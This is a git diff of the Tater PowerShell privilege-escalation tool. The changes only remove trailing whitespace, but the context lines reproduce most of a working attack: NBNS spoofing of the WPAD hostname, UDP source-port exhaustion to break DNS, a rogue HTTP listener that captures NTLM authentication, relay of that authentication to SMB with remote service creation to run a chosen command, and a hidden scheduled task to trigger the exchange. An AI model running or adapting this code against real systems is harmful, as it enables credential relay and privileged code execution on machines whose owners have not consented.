@@ -82,7 +82,7 @@ https://github.com/Kevin-Robertson/Tater
 # Default parameter values can be modified in this section
 [CmdletBinding()]
 param
-( 
+(
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNSLimit="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ExhaustUDP="N",
@@ -97,7 +97,7 @@ param
     [parameter(Mandatory=$false)][Int]$RunTime="",
     [parameter(Mandatory=$false)][ValidateSet(0,1,2)][Int]$Trigger="1",
     [parameter(Mandatory=$true)][String]$Command="",
-    [parameter(Mandatory=$false)][String]$Hostname="WPAD",  
+    [parameter(Mandatory=$false)][String]$Hostname="WPAD",
     [parameter(Mandatory=$false)][String]$Taskname="Tater",
     [parameter(Mandatory=$false)][String]$WPADPort="80",
     [parameter(Mandatory=$false)][Array]$WPADDirectHosts,
@@ -110,7 +110,7 @@ if ($invalid_parameter)
 }
 
 if(!$IP)
-{ 
+{
     $IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
 }
 
@@ -223,7 +223,7 @@ elseif($Trigger -eq 2)
 {
     $tater.status_queue.Add("Scheduled Task Trigger Enabled") > $null
     $tater.taskname = $Taskname -replace " ","_"
-    
+
     if($TaskDelete -eq 'Y')
     {
         $tater.status_queue.Add("Scheduled Task Prefix = $Taskname") > $null
@@ -270,7 +270,7 @@ elseif($RunTime -gt 1)
 if($ShowHelp -eq 'Y')
 {
     $tater.status_queue.Add("Run Stop-Tater to stop Tater early") > $null
-        
+
     if($tater.console_output)
     {
         $tater.status_queue.Add("Use Get-Command -Noun Tater* to show available functions") > $null
@@ -350,7 +350,7 @@ $shared_basic_functions_scriptblock =
 
         if($tater.SMBRelay_success)
         {
-          
+
             if($tater.trigger -eq 2)
             {
 
@@ -369,7 +369,7 @@ $shared_basic_functions_scriptblock =
                         {
                             $scheduled_task_folder.DeleteTask($scheduled_task.name,0)
                         }
-                    
+
                     }
 
                     foreach($scheduled_task in $scheduled_task_list)
@@ -379,12 +379,12 @@ $shared_basic_functions_scriptblock =
                         {
                             $scheduled_task_deleted = $true
                         }
-                    
+
                     }
 
                     if($scheduled_task_deleted)
                     {
-                        $tater.console_queue.Add("$(Get-Date -format 's') - Scheduled task " + $tater.task + " deleted successfully") 
+                        $tater.console_queue.Add("$(Get-Date -format 's') - Scheduled task " + $tater.task + " deleted successfully")
                     }
                     else
                     {
@@ -406,7 +406,7 @@ $shared_basic_functions_scriptblock =
             $tater.console_queue.Add("$(Get-Date -format 's') - Tater was not successful and has exited")
         }
 
-        Start-Sleep -s 1 
+        Start-Sleep -s 1
         $tater.running = $false
     }
 
@@ -446,10 +446,10 @@ $SMB_relay_challenge_scriptblock =
         {
             $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
         }
-        
+
         $SMB_relay_challenge_bytes = New-Object System.Byte[] 1024
         $i = 0
-        
+
         :SMB_relay_challenge_loop while ($i -lt 2)
         {
 
@@ -461,13 +461,13 @@ $SMB_relay_challenge_scriptblock =
                     $SMB_relay_challenge_send = 0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,
                                                 0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                 0x00,0x00,0xff,0xff +
-                                                $tater.process_ID_bytes + 
+                                                $tater.process_ID_bytes +
                                                 0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,
                                                 0x20,0x30,0x2e,0x31,0x32,0x00
                 }
-                
+
                 1
-                { 
+                {
                     $SMB_blob_length = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length))
                     $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
                     $SMB_blob_length = $SMB_blob_length.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
@@ -478,7 +478,7 @@ $SMB_relay_challenge_scriptblock =
                     $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
                     $SMB_netbios_length = $SMB_netbios_length.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                     [Array]::Reverse($SMB_netbios_length)
-                    
+
                     $SMB_relay_challenge_send = 0x00,0x00 +
                                                 $SMB_netbios_length +
                                                 0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x03,0xc8,0x00,
@@ -502,7 +502,7 @@ $SMB_relay_challenge_scriptblock =
             $SMB_relay_challenge_stream.Read($SMB_relay_challenge_bytes,0,$SMB_relay_challenge_bytes.Length)
             $i++
         }
-        
+
         return $SMB_relay_challenge_bytes
     }
 
@@ -515,14 +515,14 @@ $SMB_relay_response_scriptblock =
     function SMBRelayResponse
     {
         param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_user_ID)
-    
+
         $SMB_relay_response_bytes = New-Object System.Byte[] 1024
 
         if ($SMB_relay_socket)
         {
             $SMB_relay_response_stream = $SMB_relay_socket.GetStream()
         }
-        
+
         $SMB_blob_length = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length))
         $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
         $SMB_blob_length = $SMB_blob_length.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
@@ -572,7 +572,7 @@ $SMB_relay_execute_scriptblock =
     function SMBRelayExecute
     {
         param ($SMB_relay_socket,$SMB_user_ID)
-    
+
         if ($SMB_relay_socket)
         {
             $SMB_relay_execute_stream = $SMB_relay_socket.GetStream()
@@ -599,13 +599,13 @@ $SMB_relay_execute_scriptblock =
         else
         {
             $SMB_relay_command += '00-00-00-00'
-        }    
-        
+        }
+
         [Byte[]] $SMB_relay_command_bytes = $SMB_relay_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         $SMB_service_data_length_bytes = [System.BitConverter]::GetBytes($SMB_relay_command_bytes.Length + $SMB_service_bytes.Length + 237)
         $SMB_service_data_length_bytes = $SMB_service_data_length_bytes[2..0]
         $SMB_service_byte_count_bytes = [System.BitConverter]::GetBytes($SMB_relay_command_bytes.Length + $SMB_service_bytes.Length + 174)
-        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0..1]   
+        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0..1]
         $SMB_relay_command_length_bytes = [System.BitConverter]::GetBytes($SMB_relay_command_bytes.Length / 2)
         $k = 0
 
@@ -614,7 +614,7 @@ $SMB_relay_execute_scriptblock =
 
             switch ($k)
             {
-            
+
                 0
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,
@@ -626,7 +626,7 @@ $SMB_relay_execute_scriptblock =
                                               0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31,0x30,0x2e,0x32,0x2e,0x31,0x30,
                                               0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00
                 }
-                  
+
                 1
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,
@@ -640,7 +640,7 @@ $SMB_relay_execute_scriptblock =
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,
                                               0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00
                 }
-                
+
                 2
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
@@ -657,15 +657,15 @@ $SMB_relay_execute_scriptblock =
                                               0x00,0x10,0x03,0x02,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,
                                               0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,
                                               0x00
-                        
+
                     $SMB_multiplex_id = 0x05
                 }
-               
+
                 3
-                { 
+                {
                     $SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                 }
-                
+
                 4
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
@@ -681,15 +681,15 @@ $SMB_relay_execute_scriptblock =
                                               0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                               $SMB_service_bytes +
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00
-                        
+
                     $SMB_multiplex_id = 0x07
                 }
-                
+
                 5
-                {  
+                {
                     $SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                 }
-                
+
                 6
                 {
                     $SMB_relay_execute_send = [Array]0x00 +
@@ -725,7 +725,7 @@ $SMB_relay_execute_scriptblock =
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                               0x00,0x00
-                        
+
                     $SMB_multiplex_id = 0x09
                 }
 
@@ -733,7 +733,7 @@ $SMB_relay_execute_scriptblock =
                 {
                     $SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                 }
-                
+
                 8
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
@@ -749,14 +749,14 @@ $SMB_relay_execute_scriptblock =
                                               $SMB_context_handler +
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                 }
-                
+
                 9
                 {
                     $SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                 }
-                
+
                 10
-                { 
+                {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                               0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                               0x00,0x00,0x00,0x08 +
@@ -776,11 +776,11 @@ $SMB_relay_execute_scriptblock =
                 }
 
             }
-           
+
             $SMB_relay_execute_stream.Write($SMB_relay_execute_send,0,$SMB_relay_execute_send.Length)
             $SMB_relay_execute_stream.Flush()
-            
-            if ($k -eq 5) 
+
+            if ($k -eq 5)
             {
                 $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes,0,$SMB_relay_execute_bytes.Length)
                 $SMB_context_handler = $SMB_relay_execute_bytes[88..107]
@@ -822,7 +822,7 @@ $SMB_relay_execute_scriptblock =
                     }
 
                 }
-                
+
                 if([System.BitConverter]::ToString($SMB_context_handler[0..3]) -ne '00-00-00-00')
                 {
                     $SMB_relay_failed = $true
@@ -834,12 +834,12 @@ $SMB_relay_execute_scriptblock =
                     $SMB_relay_failed = $true
                 }
 
-            }        
+            }
             else
             {
-                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes,0,$SMB_relay_execute_bytes.Length)    
+                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes,0,$SMB_relay_execute_bytes.Length)
             }
-            
+
             if(!$SMB_relay_failed -and $k -eq 7)
             {
                 $tater.console_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $SMBRelayTarget")
@@ -851,8 +851,8 @@ $SMB_relay_execute_scriptblock =
             elseif(!$SMB_relay_failed -and $k -eq 11)
             {
                 $tater.console_queue.Add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $SMBRelayTarget")
-            }   
-            
+            }
+
             $SMB_relay_execute_ReadAndRequest = 0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,
                                                 0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                 0x00,0x00,0x00,0x08 +
@@ -861,7 +861,7 @@ $SMB_relay_execute_scriptblock =
                                                 $SMB_multiplex_ID +
                                                 0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x58,
                                                 0x02,0x58,0x02,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00
-            
+
             if($SMB_relay_failed)
             {
                 $tater.console_queue.Add("$(Get-Date -format 's') - SMB relay failed on $SMBRelayTarget")
@@ -871,9 +871,9 @@ $SMB_relay_execute_scriptblock =
             $k++
 
         }
-        
+
         $tater.SMB_relay_active_step = 0
-        
+
         $SMB_relay_socket.Close()
 
         if(!$SMB_relay_failed)
@@ -886,7 +886,7 @@ $SMB_relay_execute_scriptblock =
 }
 
 # HTTP Server ScriptBlock - HTTP listener
-$HTTP_scriptblock = 
+$HTTP_scriptblock =
 {
     param ($Command,$HTTPPort,$WPADDirectHosts,$WPADPort)
 
@@ -934,13 +934,13 @@ $HTTP_scriptblock =
                                            0x73,0x28,0x68,0x6f,0x73,0x74,0x2c,0x20,0x22 +
                                            $WPAD_direct_host_bytes +
                                            0x22,0x29,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x44,0x49,
-                                           0x52,0x45,0x43,0x54,0x22,0x3b 
-        
+                                           0x52,0x45,0x43,0x54,0x22,0x3b
+
         $WPAD_direct_hosts_bytes += $WPAD_direct_host_function_bytes
     }
 
     $WPAD_port_bytes = [System.Text.Encoding]::UTF8.GetBytes($WPADPort)
-    
+
     :HTTP_listener_loop while ($tater.running)
     {
 
@@ -974,7 +974,7 @@ $HTTP_scriptblock =
         if(!$tater.HTTP_client.Connected)
         {
             $tater.HTTP_client = $tater.HTTP_listener.AcceptTcpClient()
-	        $HTTP_stream = $tater.HTTP_client.GetStream() 
+	        $HTTP_stream = $tater.HTTP_client.GetStream()
         }
 
         while ($HTTP_stream.DataAvailable)
@@ -989,7 +989,7 @@ $HTTP_scriptblock =
             $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
             $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
             $tater.request_RawUrl = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
-        
+
             if($tater.request_RawUrl -eq "")
             {
                 $tater.request_RawUrl = "/"
@@ -1011,7 +1011,7 @@ $HTTP_scriptblock =
 
         $HTTP_type = "HTTP"
         $HTTP_request_type = ""
-        
+
         if ($tater.request_RawUrl -match '/wpad.dat')
         {
             $tater.response_StatusCode = 0x32,0x30,0x30
@@ -1073,7 +1073,7 @@ $HTTP_scriptblock =
             [byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
             $tater.response_StatusCode = 0x34,0x30,0x31
             $HTTP_response_phrase = 0x4f,0x4b
-            
+
             if ($HTTP_request_bytes[8] -eq 1)
             {
 
@@ -1084,13 +1084,13 @@ $HTTP_scriptblock =
                     $tater.console_queue.Add("$(Get-Date -format 's') - Grabbing challenge for relay from " + "$SMBRelayTarget")
                     $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
                     $SMB_relay_socket.connect($SMBRelayTarget,"445")
-                    
+
                     if(!$SMB_relay_socket.connected)
                     {
                         $tater.console_queue.Add("$(Get-Date -format 's') - SMB relay target is not responding")
                         $tater.SMB_relay_active_step = 0
                     }
-                    
+
                     if($tater.SMB_relay_active_step -eq 1)
                     {
                         $SMB_relay_bytes = SMBRelayChallenge $SMB_relay_socket $HTTP_request_bytes
@@ -1108,7 +1108,7 @@ $HTTP_scriptblock =
                         $SMB_relay_NTLM_challenge = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 24)..($SMB_relay_NTLMSSP_bytes_index + 31)]
                         $SMB_reserved = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 32)..($SMB_relay_NTLMSSP_bytes_index + 39)]
                         $SMB_relay_target_details = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
-                    
+
                         $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                            $SMB_domain_length_offset_bytes +
                                            0x05,0xc2,0x89,0xa2 +
@@ -1116,7 +1116,7 @@ $HTTP_scriptblock =
                                            $SMB_reserved +
                                            $SMB_target_length_offset_bytes +
                                            $SMB_relay_target_details
-                    
+
                         $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                         $NTLM = 'NTLM ' + $NTLM_challenge_base64
                         $NTLM_challenge = SMBNTLMChallenge $SMB_relay_bytes
@@ -1135,10 +1135,10 @@ $HTTP_scriptblock =
                 {
                      $NTLM = NTLMChallengeBase64
                 }
-                
+
                 $tater.response_StatusCode = 0x34,0x30,0x31
                 $HTTP_response_phrase = 0x4f,0x4b
-                
+
             }
             elseif ($HTTP_request_bytes[8] -eq 3)
             {
@@ -1147,13 +1147,13 @@ $HTTP_scriptblock =
                 $HTTP_NTLM_length = DataLength 22 $HTTP_request_bytes
                 $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_bytes
                 $HTTP_NTLM_domain_offset = DataLength 32 $HTTP_request_bytes
-                       
+
                 if($HTTP_NTLM_domain_length -eq 0)
                 {
                     $HTTP_NTLM_domain_string = ''
                 }
                 else
-                {  
+                {
                     $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                 }
 
@@ -1170,24 +1170,24 @@ $HTTP_scriptblock =
                     $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                     $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
                 }
-          
+
                 $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                 $NTLM_response = $NTLM_response.Insert(32,':')
                 $tater.response_StatusCode = 0x32,0x30,0x30
                 $HTTP_response_phrase = 0x4f,0x4b
                 $NTLM_challenge = ''
-                
+
                 if ($tater.SMB_relay_active_step -eq 3)
                 {
                     $tater.console_queue.Add("$(Get-Date -format 's') - Sending response for " + "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to " + "$SMBRelaytarget")
                     $SMB_relay_response_return_bytes = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_user_ID
                     $SMB_relay_response_return_bytes = $SMB_relay_response_return_bytes[1..$SMB_relay_response_return_bytes.Length]
-                    
+
                     if(!$SMB_relay_failed -and [System.BitConverter]::ToString($SMB_relay_response_return_bytes[9..12]) -eq ('00-00-00-00'))
                     {
                         $tater.console_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay " + "authentication successful for $HTTP_NTLM_domain_string\" + "$HTTP_NTLM_user_string on $SMBRelayTarget")
                         $tater.SMB_relay_active_step = 4
-                        SMBRelayExecute $SMB_relay_socket $SMB_user_ID          
+                        SMBRelayExecute $SMB_relay_socket $SMB_user_ID
                     }
                     else
                     {
@@ -1203,12 +1203,12 @@ $HTTP_scriptblock =
             {
                 $NTLM = 'NTLM'
             }
-             
+
         }
 
         $HTTP_timestamp = Get-Date -format r
         $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)
-        
+
         $HTTP_WWW_authenticate_header = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,
                                         0x74,0x65,0x3a,0x20
 
@@ -1248,7 +1248,7 @@ $HTTP_scriptblock =
                              0x0a,0x44,0x61,0x74,0x65,0x3a +
                              $HTTP_timestamp +
                              0x0d,0x0a,0x0d,0x0a +
-                             $HTTP_WPAD_response 
+                             $HTTP_WPAD_response
         }
         elseif($HTTP_request_type -eq 'Redirect')
         {
@@ -1278,7 +1278,7 @@ $HTTP_scriptblock =
                              $HTTP_timestamp +
                              0x0d,0x0a,0x0d,0x0a
         }
-        
+
         $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)
         $HTTP_stream.Flush()
         start-sleep -s 1
@@ -1288,7 +1288,7 @@ $HTTP_scriptblock =
 
 }
 
-$exhaust_UDP_scriptblock = 
+$exhaust_UDP_scriptblock =
 {
     $tater.exhaust_UDP_running = $true
     $tater.console_queue.Add("$(Get-Date -format 's') - Trying to exhaust UDP source ports so DNS lookups will fail")
@@ -1368,7 +1368,7 @@ $exhaust_UDP_scriptblock =
     $tater.exhaust_UDP_running = $false
 }
 
-$spoofer_scriptblock = 
+$spoofer_scriptblock =
 {
     param ($IP,$SpooferIP,$Hostname,$NBNSLimit)
 
@@ -1401,7 +1401,7 @@ $spoofer_scriptblock =
                             0x00,0x20,0x00,0x01,0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00 +
                             ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                             0x00,0x00,0x00,0x00
-      
+
     while($tater.exhaust_UDP_running)
     {
         Start-Sleep -s 2
@@ -1411,12 +1411,12 @@ $spoofer_scriptblock =
     DnsFlushResolverCache
 
     $tater.console_queue.Add("$(Get-Date -format 's') - Starting NBNS spoofer to resolve $Hostname to $SpooferIP")
-              
+
     $send_socket = New-Object System.Net.Sockets.UdpClient(137)
     $destination_IP = [System.Net.IPAddress]::Parse($IP)
     $destination_point = New-Object Net.IPEndpoint($destination_IP,137)
     $send_socket.Connect($destination_point)
-       
+
     while ($tater.running)
     {
 
@@ -1429,7 +1429,7 @@ $spoofer_scriptblock =
                 for ($j = 0; $j -lt 255; $j++)
                 {
                     $NBNS_response_packet[0] = $i
-                    $NBNS_response_packet[1] = $j                 
+                    $NBNS_response_packet[1] = $j
                     $send_socket.Send($NBNS_response_packet,$NBNS_response_packet.Length)
 
                     if($tater.hostname_spoof -and $NBNSLimit -eq 'Y')
@@ -1449,12 +1449,12 @@ $spoofer_scriptblock =
     $send_socket.Close()
  }
 
-$tater_scriptblock = 
+$tater_scriptblock =
 {
     param ($NBNS,$NBNSLimit,$RunTime,$SpooferIP,$Hostname,$HTTPPort)
-    
+
     if($RunTime)
-    {    
+    {
         $tater_timeout = new-timespan -Minutes $RunTime
         $tater_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
     }
@@ -1473,7 +1473,7 @@ $tater_scriptblock =
             {
                 # Don't need output for this
             }
-            
+
             if($Hostname_IP -eq $SpooferIP)
             {
 
@@ -1533,19 +1533,19 @@ $tater_scriptblock =
                 $timestamp_add = (Get-Date).AddMinutes(1)
                 $timestamp_add_string = $timestamp_add.ToString("HH:mm")
                 $tater.task = $tater.taskname
-                
+
                 if($tater.task_delete)
                 {
                     $tater.task += "_"
-                    $tater.task += Get-Random   
+                    $tater.task += Get-Random
                 }
 
                 $tater.console_queue.Add("$(Get-Date -format 's') - Adding scheduled task " + $tater.task)
                 $process_scheduled_task = "/C schtasks.exe /Create /TN " + $tater.task + " /TR  \\127.0.0.1@$HTTPPort\test /SC ONCE /ST $timestamp_add_string /F"
                 Start-Process -FilePath "cmd.exe" -Argument $process_scheduled_task -WindowStyle Hidden -passthru -Wait
-                
+
                 $schedule_service = new-object -com("Schedule.Service")
-                $schedule_service.connect() 
+                $schedule_service.connect()
                 $scheduled_task_list = $schedule_service.getfolder("\").gettasks(1)
 
                 $tater.task_added = $false
@@ -1557,7 +1557,7 @@ $tater_scriptblock =
                     {
                         $tater.task_added = $true
                     }
-                
+
                 }
 
                 $schedule_service.Quit()
@@ -1589,15 +1589,15 @@ $tater_scriptblock =
             {
                 StopTater
             }
-        
-        } 
-           
+
+        }
+
         Start-Sleep -m 5
     }
 
  }
 
-# HTTP Listener Startup Function 
+# HTTP Listener Startup Function
 function HTTPListener()
 {
 
